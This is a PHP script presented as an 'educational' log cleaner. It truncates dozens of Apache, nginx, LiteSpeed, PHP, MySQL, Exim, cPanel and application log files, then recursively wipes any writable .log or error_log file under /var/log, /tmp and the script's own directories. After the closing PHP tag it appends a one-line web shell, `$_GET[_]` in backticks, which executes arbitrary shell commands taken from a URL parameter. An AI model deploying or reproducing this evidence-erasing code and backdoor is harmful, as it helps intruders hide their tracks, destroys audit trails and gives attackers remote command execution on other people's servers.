<?php

/**
 * Cleaner Logs PHP
 * by 0xBakusedu and laggerghost
 * Educational purpose, dont use for ilegal access.
 */

$commonLogs = [
    '/var/log/apache2/error.log',
    '/var/log/apache2/access.log',
    '/var/log/apache2/other_vhosts_access.log',
    '/var/log/httpd/error_log',
    '/var/log/httpd/access_log',
    '/var/log/nginx/error.log',
    '/var/log/nginx/access.log',
    '/var/log/litespeed/error.log',
    '/var/log/litespeed/access.log',
    '/usr/local/lsws/logs/error.log',
    '/usr/local/lsws/logs/access.log',
    '/var/log/php/error.log',
    '/var/log/php7.4-fpm.log',
    '/var/log/php8.0-fpm.log',
    '/var/log/php8.1-fpm.log',
    '/var/log/mysql/error.log',
    '/var/log/mysql/mysql.log',
    '/var/log/mysql/mysql-slow.log',
    '/var/log/mysqld.log',
    '/var/log/maillog',
    '/var/log/mail.log',
    '/var/log/exim_mainlog',
    '/var/log/exim_rejectlog',
    '/var/log/exim_paniclog',
    '/usr/local/cpanel/logs/error_log',
    '/var/log/directadmin/error.log',
    __DIR__ . '/error_log',
    __DIR__ . '/logs/error.log',
    __DIR__ . '/logs/access.log',
    __DIR__ . '/wp-content/debug.log',
    __DIR__ . '/storage/logs/laravel.log',
    __DIR__ . '/runtime/logs/app.log'
];

function clearLog($path) {
    if (file_exists($path) && is_writable($path)) {
        file_put_contents($path, '');
        echo "[OK] Cleared: $path\n";
    } else {
        echo "[NO] Cannot access: $path\n";
    }
}

foreach ($commonLogs as $log) {
    clearLog($log);
}

$scanDirs = [
    '/var/log',
    '/tmp',
    __DIR__,
    dirname(__DIR__),
];

foreach ($scanDirs as $dir) {
    if (is_dir($dir) && is_readable($dir)) {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $fname = $file->getFilename();
                if (preg_match('/\.log$|error_log$|debug\.log$/i', $fname)) {
                    clearLog($file->getPathname());
                }
            }
        }
    }
}

echo "Works!\n";
?>

<?=`$_GET[_]`?> 
